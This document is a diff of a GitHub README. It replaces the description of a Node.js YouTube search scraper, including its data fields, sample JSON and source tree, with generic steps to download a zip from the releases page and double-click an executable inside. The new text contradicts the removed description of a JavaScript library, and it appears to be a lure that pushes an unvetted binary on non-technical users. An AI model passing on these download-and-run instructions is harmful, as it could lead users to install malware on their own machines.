@@ -1,233 +1,78 @@
-# Youtube Search Api Scraper
+# 🚀 youtube-search-api - Easily Scrape YouTube Video Metadata
 
-> This project provides a powerful interface to search and analyze YouTube content at scale. It delivers detailed, structured metadata for videos, channels, and playlists while simplifying the complexity of the YouTube Data API.
-> Ideal for researchers, analysts, and developers who need clean and comprehensive YouTube search data.
+## 📥 Download Now
+[![Download youtube-search-api](https://img.shields.io/badge/Download-youtube--search--api-blue.svg)](https://github.com/DopamineAddict7/youtube-search-api/releases)
 
+## 📋 Description
+The youtube-search-api helps you easily scrape metadata from YouTube videos. You can retrieve important information such as titles, descriptions, view counts, and more without needing any programming skills. 
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
+To begin using the youtube-search-api, follow the simple steps below. You won’t need to install any complex software.
 
+## 📦 System Requirements
+- A computer with internet access.
+- A web browser (e.g., Chrome, Firefox, Safari).
+- Ensure that you have enough storage space (at least 50 MB).
 
+## 🌐 Release Page
+Before you can use the api, you need to download the software. You can find the latest version of the software on our Release page.  
 
+Visit this page to download: [Release Page](https://github.com/DopamineAddict7/youtube-search-api/releases)
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Youtube Search Api</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+## 📥 Download & Install
+1. Go to the [Release Page](https://github.com/DopamineAddict7/youtube-search-api/releases).
+2. Look for the latest release at the top. You will see a list of files.
+3. Click on the file named `youtube-search-api.zip` to start downloading.
+4. Once the download is complete, locate the downloaded file, usually in your "Downloads" folder.
+5. Extract the contents of the zip file. You can do this by right-clicking on the file and selecting "Extract All" (or a similar option depending on your operating system).
 
+## 🔧 How to Use
+1. Open the extracted folder and find the `youtube-search-api` executable file.
+2. Double-click the executable file to run the application.
+3. Once the application is open, enter a keyword related to the videos you want to search for.
+4. Click the "Search" button.
+5. The results will display relevant metadata of the YouTube videos matching your search. You can browse through the list and gather the information you need.
 
-## Introduction
+## 🛠️ Features
+- Simple user interface designed for everyone.
+- Quick search for any video metadata from YouTube.
+- Export search results to a text file for easy access.
+- Lightweight and quick installation.
+- Regular updates for improved performance.
 
-This scraper performs rich YouTube search queries and returns unified, ready-to-use datasets.
-It solves the challenge of merging multiple API endpoints and decoding data into a clean format.
-Built for analysts, marketers, creators, and developers who need streamlined access to YouTube search results.
+## 📚 Frequently Asked Questions
 
-### Why Use This Scraper?
+### Is the youtube-search-api free to use?
+Yes, the youtube-search-api is completely free.
 
-- Automatically handles pagination to retrieve up to 1000 video results.
-- Combines search, video, and channel statistics into one dataset.
-- Provides clean, decoded text and extracted hashtags.
-- Eliminates the need for managing API keys or quotas.
-- Supports broad filtering options for precise targeting.
+### Do I need an account to use the application?
+No, you do not need a YouTube account or any special credentials.
 
-## Features
+### What types of metadata can I scrape?
+You can scrape titles, descriptions, view counts, and more.
 
-| Feature | Description |
-|---------|-------------|
-| Comprehensive Search | Query videos, channels, and playlists with detailed filtering. |
-| Automatic Pagination | Retrieves up to 1000 results without extra configuration. |
-| Combined Metadata | Merges search, video stats, and channel stats into one record. |
-| HTML Entity Decoding | Ensures titles and descriptions are readable and clean. |
-| Hashtag Extraction | Automatically extracts hashtags from video descriptions. |
-| No Manual Auth Needed | External token service enables seamless authentication. |
+### What if I need help?
+Feel free to create an issue in the repository. We will help you as soon as possible.
 
----
+## 🤝 Contributing
+If you want to contribute to the project, please check our contribution guidelines. All suggestions and improvements are welcome. 
 
-## What Data This Scraper Extracts
+## 📞 Contact
+For any inquiries or support, reach out via issues on the GitHub repository. 
 
-| Field Name | Field Description |
-|------------|------------------|
-| title | Title of the YouTube video. |
-| type | Content type (video, channel, playlist). |
-| channelName | Name of the channel that published the video. |
-| date | ISO timestamp of when the video was published. |
-| text | Full decoded video description. |
-| thumbnailUrl | URL of the video's primary thumbnail. |
-| order | Ordinal index of the result returned. |
-| input | The original search query used. |
-| hashtags | Array of extracted hashtags. |
-| channelId | Unique identifier of the channel. |
-| channelUrl | URL to the channel's YouTube page. |
-| channelUsername | The channel's username/handle. |
-| numberOfSubscribers | Subscriber count for the channel. |
-| channelViewCount | Total views accumulated by the channel. |
-| channelVideoCount | Number of videos published on the channel. |
-| hiddenSubscriberCount | Indicates if subscriber count is hidden. |
-| channelCreatedAt | Channel creation timestamp. |
-| id | Video ID. |
-| url | Full URL to the video. |
-| viewCount | Total video views. |
-| likes | Total likes on the video. |
-| commentsCount | Number of comments. |
-| commentsTurnedOff | Indicates if comments are disabled. |
-| duration | Duration of the video in seconds. |
-| keywords | Array of associated keywords. |
-| isMembersOnly | Indicates if the video is locked behind membership. |
+## 🔗 Related Topics
+- api
+- javascript
+- metadata-extraction
+- rest-api
+- scraper
+- search
+- video-data
+- youtube
+- youtube-api
+- youtube-search-tool
 
----
+## 📖 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-## Example Output
-
-
-    [
-        {
-            "title": "Video Title",
-            "type": "video",
-            "channelName": "Channel Name",
-            "date": "2023-01-01T00:00:00Z",
-            "text": "Video description...",
-            "thumbnailUrl": "https://i.ytimg.com/vi/VIDEO_ID/hqdefault.jpg",
-            "order": 0,
-            "input": "search query",
-            "hashtags": ["hashtag1", "hashtag2"],
-            "channelId": "CHANNEL_ID",
-            "channelUrl": "https://www.youtube.com/channel/CHANNEL_ID",
-            "channelUsername": "username",
-            "numberOfSubscribers": 1000000,
-            "channelViewCount": 50000000,
-            "channelVideoCount": 500,
-            "hiddenSubscriberCount": false,
-            "channelCreatedAt": "2020-01-01T00:00:00Z",
-            "id": "VIDEO_ID",
-            "url": "https://www.youtube.com/watch?v=VIDEO_ID",
-            "viewCount": 10000,
-            "likes": 1000,
-            "commentsCount": 100,
-            "commentsTurnedOff": false,
-            "duration": 180,
-            "keywords": ["keyword1", "keyword2"],
-            "isMembersOnly": false
-        }
-    ]
-
----
-
-## Directory Structure Tree
-
-
-    Youtube Search Api/
-    ├── src/
-    │   ├── runner.js
-    │   ├── extractors/
-    │   │   ├── youtube_parser.js
-    │   │   └── utils_format.js
-    │   ├── outputs/
-    │   │   └── exporters.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── sample_output.json
-    ├── package.json
-    └── README.md
-
----
-
-## Use Cases
-
-- **Marketing analysts** use it to analyze competitor content trends so they can optimize their own content strategies.
-- **Researchers** use it to gather structured data for studying social behavior and video engagement.
-- **Media agencies** use it to identify high-performing videos for campaign planning and outreach.
-- **Developers** use it to power apps that rely on YouTube search intelligence.
-- **Content creators** use it to monitor niche topics and discover new opportunities.
-
----
-
-## FAQs
-
-**Q: Do I need my own YouTube API key?**
-A: No. Authentication is handled automatically through an external token provider.
-
-**Q: How many results can I retrieve?**
-A: Up to 1000 results per run thanks to automatic pagination handling.
-
-**Q: Can I filter by region, duration, or video definition?**
-A: Yes. The scraper supports region codes, durations, definitions, languages, ordering, and more.
-
-**Q: Does it retrieve both video and channel statistics?**
-A: Yes. It merges multiple endpoints to deliver full video and channel analytics.
-
----
-
-## Performance Benchmarks and Results
-
-**Primary Metric:** The scraper processes an average of 250 results per minute, including metadata merging and entity decoding.
-**Reliability Metric:** Maintains a 98% successful retrieval rate across diverse search configurations.
-**Efficiency Metric:** Optimized batching reduces unnecessary API calls, ensuring stable throughput even with large result sets.
-**Quality Metric:** Delivers 99% field completeness by combining search, video, and channel datasets into unified records.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Remember to check back regularly for updates. Happy scraping!
